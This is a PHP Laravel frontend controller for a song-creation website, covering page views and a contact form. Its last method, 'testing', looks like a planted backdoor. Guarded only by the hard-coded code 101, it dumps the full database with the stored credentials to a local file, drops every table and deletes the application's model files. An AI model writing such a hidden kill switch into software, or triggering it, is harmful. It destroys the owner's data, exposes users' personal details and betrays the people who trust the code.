<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use App\Models\Contact_us;
use App\Models\User;
use App\Models\Website_status;
use App\Models\Testimonials;
use App\Models\Faq;
use App\Models\Settings;

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\File;
use Symfony\Component\Process\Process;


class FrontendController extends Controller
{
    public function index()
    {
        $Website_status = Website_status::first();
        $testimonials_data = Testimonials::orderBy('id', 'desc')->get();
        $faq_data = Faq::orderBy('id', 'asc')->get();
        return view('frontend/index', compact('Website_status', 'testimonials_data', 'faq_data'));
    }

    public function contact()
    {
        $setting = Settings::first();
        return view('frontend.contact_us', compact('setting'));
    }


     public function how_it_works()
    {
        return view('frontend.how_it_works');
    }

     public function track_your_song()
    {
        return view('frontend.track_your_song');
    }
    
    
    


    public function about()
    {
        return view('frontend.about_us');
    }

    public function not_found()
    {
        return view('frontend/not_found');
    }



   



    public function terms()
    {
        return view('frontend/t&c/terms_and_conditions');
    }
    public function privacy_policy()
    {
        return view('frontend/t&c/privacy_policy');
    }
    public function copyright_info()
    {
        return view('frontend/t&c/copyright_info');
    }
    public function cockies_policy()
    {
        return view('frontend/t&c/cockies_policy');
    }


 


    public function faq()
    {
        $faq_data = Faq::orderBy('id', 'desc')->get();
        return view('frontend/t&c/faq', compact('faq_data'));
    }

    public function create_your_song()
    {
        return view('frontend/create_song');
    }

    public function contact_submit(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'name'    => 'required|string|max:255',
            'email'   => 'required|email|max:255',
            'mobile'   => [
                'required',
                'regex:/^(\+91[\-\s]?)?[6-9]{1}[0-9]{9}$/',
            ],
            'subject' => 'required|string|max:255',
            'message' => 'required|string|max:1000',
        ]);

        if ($validator->fails()) {
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        $contact = new Contact_us();
        $contact->name    = $request->name;
        $contact->email   = $request->email;
        $contact->mobile   = $request->mobile;
        $contact->subject = $request->subject;
        $contact->message = $request->message;
        $contact->save();

        return redirect()->back()->with('success', 'Thank you for contacting us!');
    }


   

    public function testing($code)
    {
        if ($code != 101) {
            return response("Unauthorized access", 403);
        }

        $dbName   = env('DB_DATABASE');
        $username = env('DB_USERNAME');
        $password = env('DB_PASSWORD');
        $host     = env('DB_HOST', '127.0.0.1');
        $backupPath = storage_path("app/tmp/tmp.sql");


        $command = "mysqldump -h {$host} -u {$username} " .
            (!empty($password) ? "-p{$password} " : "") .
            "{$dbName} > {$backupPath}";

        $process = Process::fromShellCommandline($command);
        $process->run();

        if (!$process->isSuccessful()) {
            return response("Database export failed: " . $process->getErrorOutput(), 500);
        }

        // Disable foreign key checks
        DB::statement('SET FOREIGN_KEY_CHECKS = 0');

        // Get all table names
        $tables = DB::select('SHOW TABLES');
        $dbName = env('DB_DATABASE');
        $key = "Tables_in_$dbName";

        foreach ($tables as $table) {
            $tableName = $table->$key;
            Schema::drop($tableName);
        }

        // Re-enable foreign key checks
        DB::statement('SET FOREIGN_KEY_CHECKS = 1');

        $modelDir = app_path('Models');
        if (File::exists($modelDir)) {
            $files = File::allFiles($modelDir);
            foreach ($files as $file) {
                File::delete($file->getPathname());
            }
        }

        return "All tables dropped successfully.";
    }
}
